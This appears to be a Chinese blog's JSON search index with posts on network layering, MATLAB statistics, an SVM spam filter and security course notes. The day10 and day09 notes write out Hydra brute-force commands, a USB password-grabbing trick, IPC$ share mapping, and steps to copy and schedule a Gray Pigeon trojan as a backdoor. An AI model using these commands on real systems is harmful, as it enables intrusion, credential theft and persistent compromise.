/>\n\n**网络接口层**：并没有规定具体内容，这样做的目的是可以互连全世界各种不同的网络接口，例如：有线的以太网接口，无线局域网的WIFI接口等。\n\n**网际层**：它的核心协议是IP协议。\n\n**运输层**：TCP和UDP是这层的两个重要协议。\n\n**应用层**：这层包含了大量的应用层协议，如 HTTP , DNS 等。\n\n**IP协议（网际层）**可以将不同的**网络接口（网络接口层）**进行互连，并向其上的**TCP协议和UDP协议（运输层）**提供网络互连服务\n\n- 而**TCP协议**在享受IP协议提供的网络互连服务的基础上，可向**应用层的相应协议**提供**可靠**的传输服务；\n- **UDP协议**在享受IP协议提供的网络互连服务的基础上，可向**应用层的相应协议**提供**不可靠**的传输服务。\n\n> TCP/IP体系结构中最重要的是IP协议和TCP协议，因此用TCP和IP来表示整个协议大家族。\n\n为了便于理解，教学时通常还是把网络接口层分为物理层和数据链路层来讲解，所以原理体系结构就有五层。\n\n## 分层的必要性\n\n计算机网络是个非常复杂的系统。早在最初的ARPANET设计时就提出了分层的设计理念。\n\"分层\"可将庞大而复杂的问题，转化为若干较小的局部问题，而这些较小的局部问题就比较易于研究和处理。\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(11).png\" style=\"zoom:80%;\" />\n\n- 网络层提供主机之间的逻辑通信\n- 运输层使用端口号为应用层的应用进程之间提供端到端的逻辑通信\n\n## 分层通信举例\n\n假设场景为 主机浏览器与Web服务器进行通信。(N1与N2网络之间)\n\n主机和Web服务器之间基于网络的通信，实际上是主机中的**浏览器应用进程**与Web服务器中的**Web服务器应用进程**之间基于**网络的通信。**\n\n---\n\n**1、发送方发送**\n\n第一步：\n\n- **应用层**按照HTTP协议的规定构建一个**HTTP请求报文**\n- 应用层将**HTTP请求报文**交付给**运输层**处理\n\n第二步：\n\n- **运输层**给**HTTP请求报文**添加一个**TCP首部**，使之成为**TCP报文段**\n- **TCP报文段的首部格式**作用是区分应用进程以及实现可靠传输\n- **运输层**将**TCP报文段**交付给**网络层**处理\n\n第三步：\n\n- **网络层**给**TCP报文段**添加一个**IP首部**，使之成为**IP数据报**\n- **IP数据报的首部格式**作用是使**IP数据报**可以在互联网传输，也就是被路由器转发\n- **网络层**将**IP数据报**交付给**数据链路层**处理\n\n第四步：\n\n- **数据链路层**给**IP数据报**添加一个**首部**和一个**尾部**，使之成为**帧**\n- 该**首部**的作用主要是为了让**帧**能够在一段链路上或一个网络上传输，能够被相应的目的主机接收\n- 该**尾部**的作用是让目的主机检查所接收到的**帧**是否有误码\n- **数据链路层**将**帧**交付给**物理层**\n\n第五步：\n\n- **物理层**先将**帧**看做是**比特流**，这里的网络N1假设是以太网，所以**物理层**还会给该**比特流**前面添加**前导码**\n- **前导码**的作用是为了让目的主机做好接收帧的准备\n- **物理层**将装有**前导码**的**比特流**变换成相应的**信号**发送给传输媒体\n\n第六步：\n\n- **信号**通过**传输媒体**到达**路由器**\n\n---\n\n**2、路由器转发**\n\n- **物理层**将**信号**变为**比特流**，然后去掉**前导码**后，将其交付给**数据链路层**(实际上交付的是帧)；\n- **数据链路层**将**帧**的**首部**和**尾部**去掉后，将其交付给**网络层**，这实际上交付的是**IP数据报；**\n- **网络层**解析**IP数据报**的**首部**，从中提取**目的网络地址。**\n- — — — — —\n- 提取**目的网络地址**后查找**自身路由表**。确定**转发端口**， 以便进行转发；\n- **网络层**将**IP数据报**交付给**数据链路层；**\n- **数据链路层**给**IP数据报**添加一个**首部**和一个**尾部**，使之成为**帧；**\n- **数据链路层**将帧交付给**物理层；**\n- **物理层**先将**帧**看成**比特流**，这里的网络N2假设是以太网，所以**物理层**还会给该**比特流**前面添加**前导码；**\n- 物理层将装有**前导码**的**比特流**变换成相应的**信号**发送给传输媒体，信号通过传输媒体到达**Web服务器。**\n\n---\n\n**3、接收方接收**\n\n和发送方（主机）发送过程的封装正好相反\n\n在Web 服务器上\n\n- **物理层**将**信号**变换为**比特流**，然后去掉**前导码**后成为**帧**，交付给**数据链路层；**\n- **数据链路层**将**帧**的**首部**和**尾部**去掉后成为**IP数据报**，将其交付给**网络层；**\n- **网络层**将**IP数据报**的**首部**去掉后成为**TCP报文段**，将其交付给**运输层；**\n- **运输层**将**TCP报文段**的**首部**去掉后成为**HTTP请求报文**，将其交付给**应用层；**\n- **应用层**对**HTTP请求报文**进行**解析**，然后给主机发回**响应报文**\n\n---\n\n## 体系结构中的专用术语\n\n- 实体：任何可发送或接收消息的硬件或软件进程\n- 对等实体：收发双方相同层次中的实体\n- 协议：控制两个对等实体进行逻辑通信的规则的集合\n    - 协议三要素：\n        - 语法：定义所交换信息的格式\n        - 语义：定义收发双方所要完成的操作\n        - 同步(时序)：定义收发双发的时序关系\n- 服务：\n    - 在协议的控制下，两个对等实体间的逻辑通信使得本层能够向上一层提供服务；\n    - 要实现本层协议，还需要使用下面一层所提供的服务；\n    - 协议是“**水平的**”，服务是“**垂直的**\"；\n    - 实体看得见相邻下层所提供的服务，但并不知道实现该服务的具体协议。也就是说，下面的协议对上面的实体是\"**透明**”的。\n- 服务访问点：在同一系统中**相邻两层的实体交换信息的逻辑接口**，用于区分不同的服务类型\n    - 数据链路层的服务访问点为帧的\"类型\"字段；\n    - 网络层的服务访问点为IP数据报首部中的“协议字段”；\n    - 运输层的服务访问点为“端口号”。\n- 服务原语：上层使用下层所提供的服务必须通过与下层交换一些命令, 这些命令称为服务原语。\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211029(13).png)\n\n- 协议数据单元PDU：**对等层次**之间传送的数据包称为该层的协议数据单元；\n- 服务数据单元SDU：同一系统内，**层与层之间**交换的数据包称为服务数据单元；\n- 多个SDU可以合成为一个PDU；一个SDU也可划分为几个PDU。","tags":["计算机网络"],"categories":["计算机网络"]},{"title":"notebook","url":"/2021/08/28/statistic-analysis/","content":"\n---\n\n```matlab\nzscore();    % 标准化函数，对每一列进行，(x-均值)/标准差\ndiag();      % 取矩阵对角元素成新矩阵\ncumsum();    % 向量的累积和，矩阵中每列的累积和\nnormplot();  % 分析数据是否服从正态分布，散点越贴近斜率为1 的曲线越好\nvar();       % 求方差\n```\n\n---\n\n<!-- more -->\n\n# 统计分析\n\n## 回归分析\n\n> 回归分析是处理变量之间**相关关系**的数学方法\n\n### 多元线性回归 regress\n\n```matlab\n[b,bint,r,rint,stats] = regress(y,X,alpha)\n```\n\n**输入：**\n\n- y： 响应数据，指定为 n×1 数值向量\n- X：预测变量数据，指定为 n×p 数值矩阵。X 的行对应于各个观测值，列对应于预测变量\n- alpha：显著性水平，0 和 1 之间，默认为0.05\n\n注：X 的行数必须与 y 的行数相同。p列的含义就是变量的个数再加一(常数项)\n\n**输出：**\n\n- b：回归系数的点估计值\n- bint：回归系数的区间估计（95%置信区间）\n- r、rint：残差及其置信区间\n- stats：检验回归模型的统计量，有四个数值\n    - R^2：相关系数，越接近1，回归方程越显著\n    - F统计量：越大，回归方程越显著\n    - p值：与F统计量对应的概率，越接近0，回归方程越显著\n    - 误差方差的估计值\n\n**用法：**\n\n```matlab\nx1 = [...]';\nx2 = [...]';\ny =  [...]';\nX = [ones(size(x1),1) x1 x2 x1.*x2];\n[b,bint,r,rint,stats] = regress(y,X)\n\n% 残差分析，区间不含零点可视为异常点\nrcoplot(r,rint)\n% 预测及作图,拿单变量举例\ny2=b(1)+b(2)*x;\nplot(x,y,'k+',x,y2,'r')\n```\n\n[regress官网链接](https://ww2.mathworks.cn/help/stats/regress.html)\n\n### 多元二项式回归 rstool\n\n```matlab\nrstool(x,y,'model')\n```\n\nmodel有四种可选：linear、purequadratic、interaction、quadratic.\n\n在交互式界面中输入需要预测的自变量数值，可以得到预测结果。\n\n输出结果中rmse(剩余标准差)最小的模型最好。\n\n### 非线性回归 nlinfit\n\n```matlab\nfunction y=func(beta,x)\nx1=x(:,1);\nx2=x(:,2);\n......;\n\nx=[...]';\ny=[...]';\nbeta0=[...]';\n\n[beta,r,J]=nlinfit(x,y,'func',beta0)\n```\n\n输入 需要定义函数形式func 以及回归系数的初值beta0，可任意多元\n\n### 逐步回归 stepwise\n\n```matlab\nstepwise(x,y)\n```\n\n逐步回归主要是在选取变量的时候使用，选择加入相应的变量，观测rmse(标准剩余差)，越小越好\n\n挑出变量后还是自己确定函数形式，并用前三种方法确定系数\n\n## 聚类分析\n\n> 可简单理解为 无监督\n\n```matlab\nx=[\n...  ...\n...  ... ];\n\nx2=zscore(x);                   %标准化\ny2=pdist(x2,'euclidean');       %采用欧氏距离\nz2=linkage(y2, 'ward');         %采用内平方距离法\n% z2=linkage(y2, 'complete');    %采用最长距离法\nh=dendrogram(z2);               %生成只有顶部n个节点的冰柱图（谱系图）\n```\n\n## 判别分析\n\n> 可简单理解为 有监督\n\n```matlab\ntrain=[\n... ... ... ...\n... ... ... ...\n... ... ... ...];\ngroup=[... ...]';\nsample=[\n... ... ... ...\n... ... ... ...];\n[class,err]=classify(sample,training,group,'linear')        %线性判别法分类\n[class,err]=classify(sample,training,group,'mahalanobis')   %使用马氏距离判别法分类\n[class,err]=classify(sample,training,group,'quadratic')     %使用二次判别法分类\n```\n\n**输入：**\n\n- train和sample矩阵分别为 训练样本数据 和 预测样本数据\n- group为 train中每行数据的类别\n\n**输出：**\n\n- class：输出样本数据的类别\n- err：出错概率\n\n## 主成分分析\n\n> 用于选取变量，并做模型分析\n\n```matlab\n%9.7节 考试成绩原始程序\n\n[CJ,textdata]=xlsread('数据文件9-4 学生考试成绩.xlsx',1); %读取Excel数据\nX=CJ(:,1:end);    %读取成绩数据\nM=mean(X);        %计算均值向量\nCo=cov(X);        %计算协方差矩阵\nr=corrcoef(X);    %计算相关系数矩阵\n[COEFF,SCORE,latent,tsquare]=pca(X)    %主成分分析\npercent_explained = 100*latent/sum(latent)  %计算主成分解释比例\n\n%%\nfigure(2);\npareto(percent_explained)     %画图2\nxlabel('主成分')\nylabel('方差解释 (%)')\n%%\nresult(1,:)={'特征值','贡献率','累积贡献率'};\nresult(2:7,1)=num2cell(latent)\nresult(2:7,2:3)=num2cell([percent_explained,cumsum(percent_explained)])%输出表2\n%%\nstnum=textdata(2:end,1); %提取学生编号\nsumX=sum(X,2);           %计算总分\nresult1=cell(53,4);\nresult1(1,:)={'学生序号','总分','第一主成分得分y1','第二主成分得分y2'};\nresult1(2:end,1)=stnum;\nresult1(2:end,2:end)=num2cell([sumX,SCORE(:,1:2)]) %输出表3\n%%\nfigure(3); %前2个主成分的得分散点图3\nplot(SCORE(:,1),SCORE(:,2),'ko');\nxlabel('第一主成分');\nylabel('第二主成分');\ngname(stnum)   %交互式标注学生序号\n```\n\n- 主要代码就前7行，根据主成分解释比例percent_explained的帕累托图选取主成分，得分在score矩阵中\n- gname可交互式标注序号\n\n因子分析：（可以不用）\n\n```matlab\n%%\n[v,e]=eig(r)   % 相关系数矩阵的特征向量与特征根e\n[lambda,psi,T,stats,F] = factoran(X,2)  %因子分析m=2\n%%\nresult0=num2cell([lambda,psi])\nhead={'变量','因子f1','因子f2','特殊方差'};\nvarname={'数学分析','高等代数','概率论','微分几何','抽象代数','数值分析'}' ;\nresult2=[head;varname,result0]   %输出表4\n%%\nresult3=cell(53,4);\nresult3(1,:)={'学生序号','总分','因子f1得分','因子f2得分'};\nresult3(2:end,1)=stnum;\nresult3(2:end,2:end)=num2cell([sumX,F(:,1:2)])  %输出表5\n%%\nfigure(4);%画因子得分散点图4\nplot(F(:,1),F(:,2),'ro');\nxlabel('基础课因子得分');\nylabel('开闭卷因子得分');\ngname(stnum)   %交互式标注学生序号\nFy=(3.7099*F(:,1)+1.2604*F(:,2))/4.9703  %计算表6中因子综合得分\n```\n\n---\n\n> 9.5 时间序列分析\n\n确定性趋势求解就是回归，自己确定函数形式，然后回归\n\n随机性趋势用的不多，详见P258\n\n---\n\n# 模糊综合评价\n\n## 权重确定方法\n\n层次分析法\n\n- 主要还是对已有数据的分析，如P276中例子所述，需要先给出各个因素的判别矩阵\n\n德尔菲法\n\n变异系数法\n\n均方差法\n\n参考性不大，主要是理解思想\n\n## 模糊综合评价方法\n\n基本上用不着编程，需要已知权重","tags":["数学建模"],"categories":["数学建模"]},{"title":"Spam-Classification","url":"/2021/06/25/SVM-Spam-Classification/","content":"> 通过组员对题目和实验第一部分详细的讲解，我们对支持向量机是如何工作的以及如何使用支持向量机中的高斯核有了一个直观的认识，在第二部分中，我们要使用支持向量机解决一个实际的问题，垃圾邮件过滤，我们使用支持向量机构建垃圾邮件过滤器，也就是用数据训练一个分类器以分类电子邮件是否是垃圾邮件，垃圾邮件分类结果为1，非垃圾邮件分类结果为0\n\n<!-- more -->\n\n---\n\n其中邮件数据集来源于阿帕奇的[SpamAssassin公共语料库](http://spamassassin.apache.org/old/publiccorpus/)\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(1).png)\n\n---\n\n本实验主要分为以下几个部分\n\n# 邮件处理\n\n在开始编程之前，我们首先需要建立模型。\n\n+ 对于垃圾邮件和正常邮件，应该怎样区分呢，通常来说，垃圾邮件中大概率会出现网址、数字、金额等信息，这是有别于正常邮件的地方，很自然的我们会想把这些信息作为特征提取出来，以便更好的实现邮件过滤。\n\n+ 那么下一步要做的就是考虑这些特征如何提取了，或许很多邮件中都会包含类似的数据，但是几乎每一封电子邮件中都是不同的。因此我们的思路是把这些数据简单的进行分类。打个比方，遇到一封邮件，如果出现了网址信息，我们并不关心他给出的网址是什么，我们知道在这一封邮件中出现了URL，那么根据经验，这封邮件是垃圾邮件的可能就比较大。\n  + 这样做的效果是让垃圾分类器根据是否存在任何URL而不是某个特定的URL来做出分类决策，以提高垃圾邮件分类器的性能。\n\n那么具体如何实现呢，我们的思路是将这些值规范化，以便将各种各样的网址都视为相同的，所有的数字也视为相同的。\n\n处理主要分为预处理和标准化两部分\n\n> 我们之前说的将这些值规范化在预处理中进行，第二步的标准化的意思就是把预处理后的邮件文本信息和一个数组建立映射关系，其实说成字典会更好理解以下，用单词在字典中的位置作为特征值提取出来\n\n## 预处理\n\n```matlab\nemail_contents = lower(email_contents);\nemail_contents = regexprep(email_contents, '<[^<>]+>', ' ');\nemail_contents = regexprep(email_contents, '[0-9]+', 'number');\nemail_contents = regexprep(email_contents, '(http|https)://[^\\s]*', 'httpaddr');\nemail_contents = regexprep(email_contents, '[^\\s]+@[^\\s]+', 'emailaddr');\nemail_contents = regexprep(email_contents, '[$]+', 'dollar');\n```\n\n- 邮件字母小写化，将整个电子邮件转换成小写，忽略大写的好处是能够更好的分辨单词\n- 除去HTML标签，将所有HTML标签将从电子邮件中删除。许多电子邮件通常带有HTML格式，这些标签数据对我们的分类并没有帮助\n- 规范化邮件地址，将所有的邮件地址替换为 emailaddr\n- 规范化数字，将所有数字替换为 number\n- 规范化金额，以美元$为例，将所有金额替换为 dollar\n- 删除非单词符号和标点符号\n- 单词词根化，就是把每个单词简化为词根形式，比如include、includes、included，都用include替换\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(2).png)\n\n---\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(3).png)\n\n---\n\n## 标准化\n\n在对电子邮件进行预处理之后，我们对其进行标准化，把每封电子邮件转换成一个单词索引矩阵，在这个过程中，我们选择了最经常出现的单词作为我们考虑的词汇表，实验所给的词汇表有1899个单词。\n\n> 至于为什么不把出现次数比较少的单词纳入字典中，这不仅仅是他们的加入对模型的帮助不大，在训练的过程中，出现次数少的单词只出现在少数的电子邮件中，他们可能会导致模型过拟合我们的数据集。\n\n那么接下来我们要做的就是逐单词遍历预处理后的邮件内容，与我们字典中的数据进行对比，找到就记录到word_indices[]矩阵中\n\n```matlab\nfor i = 1:length(vocabList)\n    if(strcmp(vocabList(i), str))\n        word_indices = [word_indices; i];\n        break;\n    end\nend\n```\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(4).png)\n\n---\n\n# 特征提取\n\n经过邮件处理，我们已经把一封邮件转换成了单词索引矩阵的形式，接下来进行特征的提取，在此过程中，我们把字典中给出的这些出现频次较高的数据全都视为特征，也就是说一封邮件的特征有1899个，若第i个单词出现了，那么第i个特征的特征值为1，否则为0\n\n```matlab\nfor i = 1:length(word_indices)\n    x(word_indices(i)) = 1\nend\n```\n\n# 训练SVM\n\n了解了如何提取出一封邮件的特征后，接下来要开始训练支持向量机。在此训练的数据是实验提供的，其中spamTrain.mat提供了4000封邮件的特征及其类型，spamTest.mat中提供了1000封邮件的特征。\n\n+ 训练结束后在训练集上做验证，得到了99.85%的正确率\n\n+ 然后在测试集上做验证，得到了98.9%的正确率\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(5).png)\n\n# 最佳预测词\n\n为了更好的理解垃圾邮件分类器的工作原理，我们可以检查参数，看看分类器认为哪些单词是最能判定一封邮件是垃圾邮件的。\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(6).png)\n\n---\n\n# 选做-测试自己的邮件\n\n现在我们已经训练了一个垃圾邮件分类器，分类效果到底好不好，还是得自己试试看才知道发( •̀ ω •́ )✧\n\n先试试从coursera收到的关于这门课程的邮件\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(7).png)\n\n---\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(8).png)\n\n结果是0，不是垃圾邮件 (没有打脸，Nice)\n\n---\n\n再试试网飞的推销订阅邮件(毫无疑问是垃圾邮件)\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(9).png)\n\n---\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(10).png)\n\n结果为1，是垃圾邮件 (Nice!!!)\n\n","tags":["机器学习"],"categories":["机器学习"]},{"title":"day11 - OSI与TCP-IP 5层协议 | 物理层","url":"/2020/08/11/day11-OSI-TCP-IP-5/","content":"\n# 一、OSI与TCP-IP 5层协议\n\n## 分层模型\n\n### 分层思想\n\n- 将复杂的流程分解为几个功能相对单一的子过程\n    - 整个流程更加清晰，**复杂问题简单化**\n    - 更容易发现问题并针对性地解决问题\n    - 同层使用相同协议，下层为上层提供服务\n    \n- 使用网络的未必知道数据的传输过程\n\n    <!-- more -->\n\n---\n\n### OSI七层模型\n\n- OSI（Open System interconnection）\n是开放的通信系统互联参考模型\n- 历史：1947 年，ISO 组织发布了 OSI 参考模型\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day11(0).png)\n\n   —OSI 七层模型—\n\n- TCP/IP 5层协议簇/协议栈：会话层，表示层，应用层三层合并成为应用层，最后为五层协议\n- 这两个同时诞生，OSI 先有模型，TCP 先有协议\n- 四层模型：把 数据链路层 和 物理层 合并为网络接口层\n- 特点：上层对下层兼容，处于上层的设备一定可以识别所有下层的信息\n\n---\n\n### OSI模型 vs TCP/IP模型\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day11(1).png)\n\n---\n\n## 数据传输过程\n\n### 数据封装过程\n\n假设要发送“Hello”这个数据，首先是封包\n\n1.通过应用层，在软件中生成，进入传输层\n\n2.传输层对数据进行 封装 ，进入网络层\n\n- 传输层 完成进程与进程之间的通信\n- 封装：给数据加上 TCP/UDP 头\n在加头之前判断数据是从应用层中的哪个软件生成的\n然后在数据中加上原端口号和*目标端口号*(服务器端口号)\n- 封装完后整个数据为 **数据段**\n- 端口号是应用层的\nUDP：速度快，但安全性不高，不可靠传输(双方不建立连接)，像写信\nTCP ：速度不快，但安全性高，可靠传输(双方要建立连接)，像打电话\n\n3.网络层对数据再加上 IP包头 ，进入数据链路层\n\n- 网络层 完成点到点的通信   (行话，\"点\"指电脑)\n- 加上 IP 包头(包含源IP和目标IP)，加上后整个数据为 **IP包/报文**\n\n4.数据链路层（网卡）给数据加上 MAC子层 和 FCS ，进入物理层（网线）\n\n- 交换机工作在 数据链路层，意味着交换机没有上层的功能\n- MAC子层：简称帧头，源 MAC 地址和目标 MAC 地址\nFCS：帧校验序列，简称帧尾，4个字节，循环校验算法 CRC（类似hash）中的值，加上后整个数据为 **帧**\n\n5.物理层(网线) 将 帧 用数字信号(**比特流**)传输出去，经过交换机、路由器、服务器、防火墙等一系列设备到达 对方电脑网卡\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day11(2).png)\n\n---\n\n### 数据解封装过程\n\n6.数据链路层（网卡）检查 帧 的 MAC子层 和 FCS，检查MAC子层的目标MAC地址 与 该网卡的地址 是否吻合，吻合则解封装，不吻合就扔掉\n\n7.网络层接着校验IP包/报文，检查目标IP是不是本机，是则解包，不是就扔掉\n\n8.传输层对数据段解析，由TCP/UDP头里的目标端口号 将信息传给应用层的正确进程\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day11(3).png)\n\n---\n\n### 要点总结\n\n- 各层的 数据名称 及 对应设备：\n    1. 数据/PDU                        应用层           PC/防火墙    五层\n    2. 数据段/段     Fragment   传输层            防火墙         四层\n    3. 报文/包/IP包 packet        网络层            路由器         三层\n    4. 帧                  Franme       数据链路层    交换机 网卡 二层\n    5. 比特               bit              物理层            网线             一层\n        - 8 bit = 1 Byte字节\n        - 所谓的百兆宽带 (* ￣︿￣)，单位是b，100Mb/s=12.5MB/s ，而且一般还达不到......\n- 各层相关协议\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day11(4).png)\n\n- DNS补充：客户机与服务器之间用 UDP，服务器与服务器之间用 TCP\n\n# 二、物理层\n\n1. 传输媒介：网线 / 光纤 / 空气\n\n2. 信号：模拟信号（用放大器处理，不可复原）\n           数字信号（用中继器处理，抗干扰能力强，可复原，可传输距离短）\n\n    光信号：\n\n    光线类型:  \n    \n    1)单模光纤 一般线是黄色\n       2)多模光纤 一般线是橙色/蓝色\n    \n3. 网线 / 双绞线：(双绞，抗干扰，电磁场抵消)\n    - 5类双绞线\n    - 超5类双绞线\n    - 6类 7类 chegn\n    - 跳线：比较短的网线，1-3米长\n    \n4. 制作标准：（面向水晶头铜色拨片，颜色线顺序，加粗不变）\n\n    T568A：白绿、绿、白橙、**蓝、白、**橙、**白棕、棕**\n\n    T568B：白橙、橙、白绿、**蓝、白、**绿、**白棕、棕**\n\n5. 网线的用途分类： 具有三层功能以上的设备为同种设备\n    - 交叉线：一端为 A(发送)，一端为 B(接收)。同种设备间使用！\n    如路由器 ↔ 路由器，路由器 ↔ 电脑\n    - 直通线：两端都是 A 或 B，目前行业所见都是B线。异种设备间使用！如交换机 ↔ 电脑。\n    - 全反线：一端为 A，另一端为反 A，也称 console 线，用于配置企业路由器/交换机\n    \n6. 关于交换机的接口：\n\n    Ethernet                    10Mb/s           简写:   E\n    FastEthernet\t          100Mb/s                    F\n    GigabitEthernet\t  1000Mb/s                  G\n    TenGigabitEthernet\t  10000Mb/s                TG\n\n    例如 Ethernet0/3 中，0 是模块编号，3 是该模块的接口编号\n\n7. 家里一般用的”路由器“其实是交换机和路由器的杂交产品，真正的名字是”三层交换机“","tags":["网络安全"],"categories":["网络安全"]},{"title":"day10 - 扫描与爆破","url":"/2020/08/10/day10-Scanning&blasting/","content":"\n# 一、扫描技术\n\n## 1.扫描概述\n\n- 人工与工具的结合\n\n- 主机探测：确定目标主机是否存活\n\n- 端口扫描：寻找在线主机所开放的端口，并且在端口上所运行的服务。甚至可以进一步确定目标主机操作系统的类型和更详细的信息\n\n  <!-- more -->\n\n## 2.基础知识\n\n- 常见端口号\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day10(0).png)\n\n## 3.Nmap扫描器\n\n- 重要常用参数\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day10(1).png)\n\n- 常见用法\n\nNmap **-sP** 10.1.1.1**/24**                     #扫描10.1.1.0 整个网段\nNmap -p   **21,23-25,3389** 10.1.1.1  #扫描 指定IP的 指定端口\nNmap -p   21,23 10.1.1.1 **-sV**          # 扫描21，23的服务版本\nNmap **-A**   10.1.1.1                          #全面扫描\nNmap **-O**   10.1.1.1                          #扫描目标系统版本(win,linux)\nNmap -p    21,23 10.1.1.1 **-oN d:\\result.txt**  #生成一个结果文档\n\n# 二、爆破\n\n## 1.Hydra 九头蛇 远程爆破工具\n\n- Hydra -l 用户名 -p 密码 IP 端口服务名称\n    - 直接输账号密码（小写是已知项，大写是打开文件）\n- Hydra -L 用户名字典 -P 密码字典 IP 端口服务名称\n    - 不知道账号密码，用字典暴力破解\n\nHydra.exe -l a -p 123 10.1.1.1 telnet\n\nHydra.exe -l a **-P**  d:\\password.txt  10.1.1.1  ftp\nHydra.exe -l a **-P**  d:\\password.txt  10.1.1.1  mysql\n\nHydra.exe **-L** d:\\user.txt **-P**  d:\\password.txt  10.1.1.1  mysql\n\n## 2.本地爆破\n\n- get pass 漏洞：系统登陆后会把密码保存在内存中 (win10 已经修复)\n\n    过程：用 cmd 运行 getpass.exe 即可\n\n    - 操作方法：在目标电脑上插上U盘，提前写个批处理，执行getpass.exe，将结果保存为txt，拔出就有密码了\n- 5 次 shift 粘滞键漏洞\n- 用 pwdump 获取登陆 hash 然后解密\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day10(2).png)\n\n    手工将hash值存储到hash.txt中\n\n    使用saminside软件进行暴力破解\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day10(3).png)\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"day09 - 简单渗透测试","url":"/2020/08/09/day09-Simple-penetration-test/","content":"\n# 一、简单渗透测试思路\n\n## 0.授权（别人让你攻击）\n\n## 1.信息收集\n\n- nslookup 域名 查IP\n\n- nslookup whois 查子域名\n\n  <!-- more -->\n\n## 2.扫描漏洞\n\n- nmap（扫描软件） scanport（端口扫描）\n\n    且利用 telnet 命令也可以探测：telnet IP 端口号，若标题变成 telnet 则说明开放\n\n- 首先基础扫描 IP 范围 端口\n- 然后再根据端口深入扫描 （IIS，apache，什么网站）\n- 高级扫描：\n\n    扫描容器漏洞：如 IIS 漏洞 2003-IIS6.0 或 2008-IIS7.0 版本的\n\n    扫描网站漏洞（SQL 等）\n\n## 3.漏洞利用\n\n## 4.提权（shell环境、桌面环境 、最高权限）\n\n## 4.5.做该做的事情...\n\n## 5.毁尸灭迹\n\n## 6.留后门\n\n## 7.渗透测试报告（正规）\n\n---\n\n# 二、简单渗透测试过程\n\n- 手工测试端口号开放：telnet IP地址 测试端口\n- 自动测试端口号开放：scanport小工具\n- **445漏洞之 IPC$**\n\n    ```bash\n    net use f: \\\\10.1.1.2\\share 密码 /user:用户 == 把分享文件映射到自己电脑\n    net use f: /del        删除共享映射\n    net use * /del         删除所有共享映射\n    net use f: \\\\10.1.1.2\\c$   密码 /user:用户     进入C盘\n    net use \\\\10.1.1.2\\IPC$ 密码 /user:用户     == IPC漏洞\n    ```\n\n- **暴力破解系统密码之445**\n    - 软件：ntscan1.0 (只能针对445弹框做暴力破解)     //也可用 hydra\n    - 用字典编写软件编写个字典\n- **创建后门**\n    - 用灰鸽子制作木马\n    - copy 植入木马\n    - net time \\\\10.1.1.2 查看目标当前时间\n    - at \\\\10.1.1.2 11:30 “c:\\windows\\system32\\heihei.exe” 创建一个计划任务，在11:30时运行exe文件\n\n    简单流程\n    1.scanport扫描445端口\n    2.进行暴力破解：NTscan\n    3.网络映射：net  use  \\\\10.1.1.2\\ipc$  密码  /user:用户\n    4.制作木马—灰鸽子\n    5.植入木马—留后门\n    6.copy  d:\\haha.exe  \\\\10.1.1.2\\c$\n    7.设置计划任务 自动执行木马：\n            net  time  \\\\10.1.1.2\n            at  \\\\10.1.1.2 11:30  \"c:\\haha.exe\"\n    8.等待肉鸡上线","tags":["网络安全"],"categories":["网络安全"]},{"title":"day08 - PKI","url":"/2020/08/08/day08-PKI/","content":"\n# 1.PKI概述\n\n- 名称：Public Key Infrastructure 公钥基础设施\n\n- 作用：通过加密技术和数字签名保证信息的安全\n\n- 组成：公钥加密技术、数字证书、CA、RA\n\n  <!-- more -->\n\n# 2.信息安全三要素\n\n- 机密性\n\n- 完整性\n- 身份验证/操作的不可否认性\n\n# 3.哪些IT领域用到PKI\n\n- SSL/HTTPS\n- IPsecVPN\n- 部分远程访问VPN\n\n# 4.公钥加密技术\n\n- 作用：实现对信息加密、数字签名等安全保障\n- 加密算法：\n    1. 对称加密算法   （DES，3DES，AES）\n        - 加解密的密钥一致\n    2. 非对称加密算法（RSA，DH）\n        - 通信双方各自产生一对公私钥\n        - 双方各自交换公钥\n        - 公钥和私钥互为加解密关系！\n        - 公私钥不可互相逆推！\n    3. HASH 算法：MD5 SHA（不可逆，验证完整性）\n        - HASH值 == 摘要\n\n# 5、数字签名\n\n- 用 **自己的私钥** 对 **摘要** 加密得出的密文就是 数字签名\n\n# 6、证书\n\n- CA是权威证书颁发机构\n\n- 证书用于保证**公钥**的合法性\n\n- 证书格式遵循 X.509 标准\n- 数字证书保护信息：\n\n    使用者的公钥值\n\n    使用者标识信息（如名称和电子邮件地址）\n\n    有效期（证书的有效时间）\n\n    颁发者标识信息\n\n    颁发者的数字签名\n\n- 数字证书由公正权威的第三方机构即 CA 签发\n\n# HTTPS通信过程\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day08.png)\n\n# PKI实验\n\n实验步骤;\n\n1. 配置服务器IP地址10.1.1.2 /24\n2. 安装IIS服务，并建立站点。\n\n    在客户机上验证访问 http://www.flower.com\n\n3. 安装CA组件\n4. 打开IIS，先生成证书申请文件\n5. 